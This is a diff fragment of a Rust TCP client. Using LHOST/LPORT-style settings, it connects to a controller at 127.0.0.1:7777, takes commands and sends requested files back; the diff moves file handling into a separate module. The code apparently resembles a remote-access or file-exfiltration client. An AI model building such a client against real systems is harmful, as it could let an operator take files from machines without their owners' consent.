@@ -1,11 +1,15 @@
+use client::files;
 use std::fs::File;
 use std::io;
 use std::io::prelude::*;
 use std::net::TcpStream;
 use std::path::PathBuf;
 
+const LHOST: &str = "127.0.0.1";
+const LPORT: &str = "7777";
+
 fn main() -> std::io::Result<()> {
-    let mut stream = TcpStream::connect("127.0.0.1:7777")?;
+    let mut stream = TcpStream::connect(format!("{}:{}", LHOST, LPORT))?;
 
     let mut string_buf: String = String::new();
     let mut char_buf: String = String::new();
@@ -63,14 +67,12 @@ fn main() -> std::io::Result<()> {
 
         let file_path = &msg[1];
         let path: PathBuf = PathBuf::from(file_path);
-        let mut buffer: Vec<u8> = Vec::new();
 
-        let mut file = File::open(&path)?;
+        let mut file = files::Files::new(path);
 
-        file.read_to_end(&mut buffer)?;
-        arr = buffer.into_boxed_slice();
+        file.content_files();
 
-        stream.write_all(&arr)?;
+        file.metadata(&msg[1]);
     }
     if msg[0] == "quit" {
         stream.write_all(msg[0].as_bytes());
